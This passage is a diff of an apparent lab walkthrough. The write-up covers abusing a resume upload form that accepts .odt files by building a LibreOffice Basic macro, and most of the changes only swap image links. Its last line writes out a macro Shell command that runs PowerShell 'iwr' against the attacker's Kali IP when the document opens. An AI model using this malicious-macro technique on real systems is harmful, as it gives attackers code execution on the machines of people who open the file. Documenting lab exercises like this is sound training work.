@@ -81,32 +81,30 @@ Enumerated top 200 UDP ports:
 
 #### - Found the following where we can upload our "resume":
 
-
+![](Pasted%20image%2020230407224227.png)
 
 #### - Tried to upload a random file and received the following:
 
-![](Images/Pasted%20image%2020220821133027.png)
-
+![](Pasted%20image%2020230407224319.png)
 
 #### - Googled ".odt file" and found the following page showing .odt files are typically created by OpenOffice and LibreOffice Writer programs:
 
-![](Images/Pasted%20image%2020220823115432.png)
+![](Pasted%20image%2020230407224402.png)
 
-![](Images/Pasted%20image%2020220823115624.png)
+![](Pasted%20image%2020230407224442.png)
 
 #### - I then downloaded LibreOffice on my kali machine by typing "sudo apt-get install -y libreoffice-writer"
 
 #### - Started LibreOffice and clicked "Writer Document":
 
-![](Images/Pasted%20image%2020220823120155.png)
+![](Pasted%20image%2020230407224535.png)
 
 #### - Clicked Tools > Macros > Organize Macros > Basic:
 
-![](Images/Pasted%20image%2020220823120412.png)
+![](Pasted%20image%2020230407224628.png)
 
 #### - Clicked "Untitled 1" > "New" and named the file Offsec1 and clicked "OK":
 
-![](Images/Pasted%20image%2020220823121002.png)
 
 
 #### - Typed Tab > Shell ("cmd /c powershell iwr [Kali IP]") between "Sub Main" and "End Sub" (which will perform an HTTP request to our IP). If we are hosting on port 80 and port is open the command should execute:
